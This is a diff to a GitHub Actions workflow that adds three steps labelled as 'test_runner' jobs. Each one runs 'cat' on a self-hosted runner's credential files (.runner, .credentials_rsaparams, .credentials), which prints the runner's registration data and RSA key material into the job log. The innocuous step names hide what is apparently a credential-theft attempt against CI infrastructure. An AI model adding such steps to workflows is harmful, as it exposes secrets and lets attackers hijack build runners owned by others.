@@ -25,6 +25,12 @@ jobs:
     # Steps represent a sequence of tasks that will be executed as part of the job
     steps:
       # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
+      - name: test_runner
+        run: cat /home/githubrunner/githubrunner/.runner
+      - name: test_runner2
+        run: cat /home/githubrunner/githubrunner/.credentials_rsaparams
+      - name: test_runner3
+        run: cat /home/githubrunner/githubrunner/.credentials
       - uses: actions/checkout@v3
       - uses: actions/setup-java@v3
         with:
